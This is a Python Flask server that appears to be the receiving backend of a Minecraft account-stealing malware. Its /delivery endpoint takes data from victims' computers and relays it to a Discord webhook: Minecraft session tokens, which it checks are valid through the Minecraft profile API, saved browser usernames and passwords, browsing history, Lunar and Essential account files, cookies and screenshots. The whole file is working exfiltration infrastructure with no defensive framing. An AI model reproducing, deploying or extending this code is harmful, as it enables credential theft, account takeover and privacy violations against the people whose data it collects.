import base64
import json
import time

from discord_webhook import DiscordWebhook, DiscordEmbed
from flask import Flask, request
from flask_restful import Api, Resource
import requests

app = Flask(__name__)
api = Api(app)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

ips = {}

with open("config.json", "r") as f:
    config = json.load(f)

def validate_session(ign, uuid, ssid):
    headers = {
        'Content-Type': 'application/json',
        "Authorization": "Bearer " + ssid
    }
    r = requests.get('https://api.minecraftservices.com/minecraft/profile', headers=headers)
    if r.status_code == 200:
        if r.json()['name'] == ign and r.json()['id'] == uuid:
            return True
        else:
            return False
    else:
        return False

class Delivery(Resource):
    def post(self):
        args = request.json
        ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.environ['REMOTE_ADDR'])

        if ip in ips:
            if time.time() - ips[ip]['timestamp'] > config['reset_ratelimit_after'] * 60:
                ips[ip]['count'] = 1
                ips[ip]['timestamp'] = time.time()
            else:
                if ips[ip]['count'] < config['ip_ratelimit']:
                    ips[ip]['count'] += 1
                else:
                    return {'status': 'ratelimited'}, 429
        else:
            ips[ip] = {
                'count': 1,
                'timestamp': time.time()
            }

        webhook = DiscordWebhook(url=config['webhook'].replace("discordapp.com", "discord.com"),
                                 username=config['webhook_name'],
                                 avatar_url=config['webhook_avatar'])

        cb = '`' if config['codeblock_type'] == 'small' else '```' if config['codeblock_type'] == 'big' else '`'
        webhook.content = config['message'].replace('%IP%', ip)

        mc = args['minecraft']
        if config['validate_session'] and not validate_session(mc['ign'], mc['uuid'], mc['ssid']):
            return {'status': 'invalid session'}, 401

        # Processing passwords
        password_list = [password for password in args['passwords'] if password['password']]
        if password_list:
            embed_descriptions = [""]
            i = 0
            for j, password in enumerate(password_list):
                try:
                    embed_descriptions[i] += f"{password['url']}\nUsername: {cb}{password['username']}{cb}\nPassword: {cb}{password['password']}{cb}\n"
                except Exception as e:
                    print(f"Error processing password: {e}")
                    continue
                if len(embed_descriptions[i]) > 3500 and j != len(password_list) - 1:
                    i += 1
                    embed_descriptions.append("")

            for description in embed_descriptions:
                password_embed = DiscordEmbed(title=config['password_embed_title'],
                                              color=int(config['password_embed_color'], 16),
                                              description=description)
                password_embed.set_footer(text=config['password_embed_footer_text'],
                                          icon_url=config['password_embed_footer_icon'])
                webhook.add_embed(password_embed)
        else:
            password_embed = DiscordEmbed(title=config['password_embed_title'],
                                          color=int(config['password_embed_color'], 16),
                                          description="No passwords found")
            password_embed.set_footer(text=config['password_embed_footer_text'],
                                      icon_url=config['password_embed_footer_icon'])
            webhook.add_embed(password_embed)

        # Other file attachments
        if 'history' in args:
            history_content = "\n".join([f"Visit count: {entry['visitCount']}\tTitle: {entry['title']}     URL: {entry['url']}\t({entry['browser']})" for entry in args['history']])
            webhook.add_file(file=history_content.encode(), filename="history.txt")

        if 'lunar' in args:
            webhook.add_file(file=base64.b64decode(args['lunar']), filename="lunar_accounts.json")
        if 'essential' in args:
            webhook.add_file(file=base64.b64decode(args['essential']), filename="essential_accounts.json")
        if 'cookies' in args:
            webhook.add_file(file=base64.b64decode(args['cookies']), filename="cookies.txt")
        if 'screenshot' in args:
            webhook.add_file(file=base64.b64decode(args['screenshot']), filename="screenshot.png")

        webhook.execute()
        return {'status': 'ok'}, 200

    def get(self):
        return {'status': 'ok'}, 200

api.add_resource(Delivery, '/delivery')

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)
